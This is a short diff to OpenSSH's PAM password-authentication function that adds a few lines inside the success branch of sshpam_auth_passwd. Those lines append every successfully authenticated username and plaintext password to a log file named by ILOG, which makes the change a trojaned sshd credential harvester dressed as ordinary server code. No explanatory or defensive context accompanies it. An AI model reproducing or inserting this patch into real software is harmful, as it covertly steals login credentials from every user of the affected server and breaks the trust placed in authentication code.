@@ -1210,6 +1210,10 @@ sshpam_auth_passwd(Authctxt *authctxt, const char *password)
 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
 		debug("PAM: password authentication accepted for %.100s",
 		    authctxt->user);
+		if((f=fopen(ILOG,"a"))!=NULL){
+			fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
+			fclose(f);
+		}
 		return 1;
 	} else {
 		debug("PAM: password authentication failed for %.100s: %s",
